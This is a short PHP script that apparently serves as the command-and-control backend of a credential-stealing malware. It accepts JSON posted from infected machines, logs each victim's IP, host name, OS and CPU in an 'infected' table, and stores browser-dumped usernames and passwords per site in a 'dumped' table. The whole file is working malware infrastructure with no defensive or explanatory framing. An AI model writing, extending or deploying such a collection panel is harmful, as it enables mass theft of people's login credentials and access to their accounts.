<?php
	require_once "db/Info.php";
	
	$bdd = $GLOBALS["bdd"];
$arr = json_decode(file_get_contents('php://input'));

// Filling "infected" table ---------------------------------------------------------------------------------------

$num = $bdd->query("SELECT * FROM infected WHERE ip = ? AND host = ?", $arr->ip, $arr->host)->numRows();

if ($num > 0) {
	$bdd->query("UPDATE infected SET os = ?, cpu = ?, latest_load = CURRENT_TIMESTAMP() WHERE ip = ? AND host = ?", $arr->os, $arr->cpu, $arr->ip, $arr->host);
} else {
	$bdd->query("INSERT INTO infected (ip, os, host, cpu) VALUES (?, ?, ?, ?);", $arr->ip, $arr->os, $arr->host, $arr->cpu);
}
	
	
	
	// Filling "extracted" table --------------------------------------------------------------------------------------
	
	function insert_login($bdd, $host, $os, $browser, $url, $username, $password) {
		$num = $bdd->query("SELECT * FROM dumped WHERE host = ? AND os = ? AND browser = ? AND url = ? AND username = ? AND password = ?;", $host, $os, $browser, $url, $username, $password)->numRows();
		
		if ($num == 0) {
			$bdd->query("INSERT INTO dumped (host, os, browser, url, username, password) VALUES (?, ?, ?, ?, ?, ?);", $host, $os, $browser, $url, $username, $password);
		}
	}
	
	if (isset($arr->dumped)) {
		$data = $arr->dumped;
		
		foreach ($data as $computer_name => $browsers) {
			foreach ($browsers as $browser_name => $urls) {
				foreach ($urls as $url => $logins) {
					foreach ($logins->logins as $login) {
						$computer_info = explode('@', $computer_name);
						insert_login($bdd, $computer_info[0], $computer_info[1], $browser_name, $url, $login->username, $login->password);
					}
				}
			}
		}
	}
	
	
	// ----------------------------------------------------------------------------------------------------------------
	
	$bdd->close();

?>